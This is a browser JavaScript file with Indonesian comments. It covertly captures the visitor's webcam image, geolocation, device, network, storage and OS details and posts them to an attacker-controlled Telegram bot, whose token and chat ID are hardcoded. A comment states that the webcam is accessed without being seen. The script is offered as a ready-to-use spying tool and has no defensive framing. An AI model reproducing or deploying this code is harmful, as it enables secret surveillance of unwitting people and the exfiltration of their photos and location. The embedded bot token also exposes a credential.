const telegramBotToken = '7999220035:AAFf2ERfvapw7SWffyme3UAU8H_0ljUav8'; // Ganti dengan token bot Anda
const chatId = '6975695436'; // Ganti dengan chat ID Anda

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

// Akses webcam tanpa terlihat
navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
    video.srcObject = stream;
    video.play();
}).catch(function(error) {
    console.error("Gagal mengakses webcam:", error);
});

// Fungsi untuk mengirim foto ke Telegram
function sendPhotoToTelegram(blob) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob);

    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    }).then(response => {
        if (response.ok) {
            console.log("Foto berhasil dikirim ke Telegram.");
        } else {
            console.error("Gagal mengirim foto ke Telegram.");
        }
    }).catch(error => {
        console.error("Error saat mengirim foto:", error);
    });
}

// Fungsi untuk mengambil foto dari video webcam
function captureImage() {
    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(function(blob) {
        sendPhotoToTelegram(blob); // Kirim foto ke Telegram
    }, 'image/jpeg');
}

// Fungsi untuk mengirim semua data ke Telegram
function sendAllInfo() {
    // Ambil foto
    captureImage();

    // Kirim lokasi
    getLocation();

    // Kirim informasi perangkat
    getDeviceInfo();

    // Kirim informasi jaringan
    getNetworkInfo();

    // Kirim informasi waktu
    getTimeInfo();

    // Kirim informasi penyimpanan
    getStorageInfo();

    // Kirim informasi sistem operasi
    getOSInfo();
}

// Fungsi untuk mendapatkan lokasi pengguna
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
            sendLocationToTelegram(locationLink);
        }, function(error) {
            console.error("Error mendapatkan lokasi: ", error);
            sendLocationToTelegram("Lokasi tidak ditemukan.");
        });
    } else {
        console.error("Geolocation tidak didukung oleh browser ini.");
        sendLocationToTelegram("Geolocation tidak didukung.");
    }
}

// Fungsi untuk mengirim lokasi ke Telegram
function sendLocationToTelegram(locationLink) {
    const message = `📍 <b>Lokasi Pengguna:</b> <a href="${locationLink}">Lihat di Google Maps</a>`;
    
    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    }).then(response => {
        if (response.ok) {
            console.log("Lokasi berhasil dikirim ke Telegram.");
        } else {
            console.error("Gagal mengirim lokasi ke Telegram.");
        }
    }).catch(error => {
        console.error("Error saat mengirim lokasi:", error);
    });
}

// Fungsi untuk mendapatkan informasi perangkat
function getDeviceInfo() {
    const deviceInfo = {
        userAgent: navigator.userAgent, // Informasi browser
        platform: navigator.platform,  // Platform perangkat (Windows, Linux, Android, dll)
        language: navigator.language,  // Bahasa yang digunakan
        online: navigator.onLine       // Status koneksi (online/offline)
    };
    const message = `
📱 <b>Informasi Perangkat Pengguna:</b>
- User Agent: ${deviceInfo.userAgent}
- Platform: ${deviceInfo.platform}
- Bahasa: ${deviceInfo.language}
- Online: ${deviceInfo.online ? "Ya" : "Tidak"}
`;

    sendMessageToTelegram(message);
}

// Fungsi untuk mendapatkan informasi jaringan
function getNetworkInfo() {
    if (navigator.connection) {
        const networkInfo = navigator.connection;
        const message = `
🌐 <b>Informasi Jaringan:</b>
- Jenis Koneksi: ${networkInfo.effectiveType}
- Kecepatan Koneksi: ${networkInfo.downlink} Mbps
- Rata-rata Latensi: ${networkInfo.rtt} ms
`;
        sendMessageToTelegram(message);
    } else {
        console.log("Informasi jaringan tidak tersedia di browser ini.");
    }
}

// Fungsi untuk mendapatkan informasi waktu
function getTimeInfo() {
    const time = new Date().toLocaleString();
    const message = `🕒 <b>Waktu Pengguna:</b> ${time}`;
    sendMessageToTelegram(message);
}

// Fungsi untuk mendapatkan informasi penyimpanan
function getStorageInfo() {
    if (navigator.storage && navigator.storage.estimate) {
        navigator.storage.estimate().then(function(estimate) {
            const message = `
💾 <b>Informasi Penyimpanan:</b>
- Total Penyimpanan: ${Math.round(estimate.quota / 1024 / 1024 / 1024)} GB
- Penyimpanan Tersedia: ${Math.round(estimate.usage / 1024 / 1024 / 1024)} GB
`;
            sendMessageToTelegram(message);
        }).catch(function(error) {
            console.error("Gagal mendapatkan informasi penyimpanan:", error);
        });
    } else {
        console.log("Informasi penyimpanan tidak tersedia di browser ini.");
    }
}

// Fungsi untuk mendapatkan informasi sistem operasi
function getOSInfo() {
    const os = navigator.platform;
    const message = `💻 <b>Informasi Sistem Operasi:</b> ${os}`;
    sendMessageToTelegram(message);
}

// Fungsi untuk mengirim pesan ke Telegram
function sendMessageToTelegram(message) {
    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    }).then(response => {
        if (response.ok) {
            console.log("Pesan berhasil dikirim ke Telegram.");
        } else {
            console.error("Gagal mengirim pesan ke Telegram.");
        }
    }).catch(error => {
        console.error("Error saat mengirim pesan:", error);
    });
}
